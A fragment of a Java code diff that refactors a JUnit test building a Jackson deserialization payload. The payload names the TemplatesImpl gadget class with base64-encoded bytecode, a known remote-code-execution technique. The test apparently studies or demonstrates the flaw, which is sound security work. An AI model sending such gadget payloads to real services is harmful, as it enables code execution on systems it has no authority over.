@@ -51,11 +51,7 @@ class Runner {
 
 	@Test
 	void viaObjectMapper() throws IOException {
-		byte[] bytes = byteCode();
-		String base64Encoded = Base64.getEncoder().encodeToString(bytes);
-		String payload = "AAIAZQ==";
-		payload = base64Encoded;
-		//language=JSON
+		String payload = Base64.getEncoder().encodeToString(byteCode());
 		final String JSON = "{\"id\": 124,\n" +
 				" \"obj\":[ \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
 				"  {\n" +
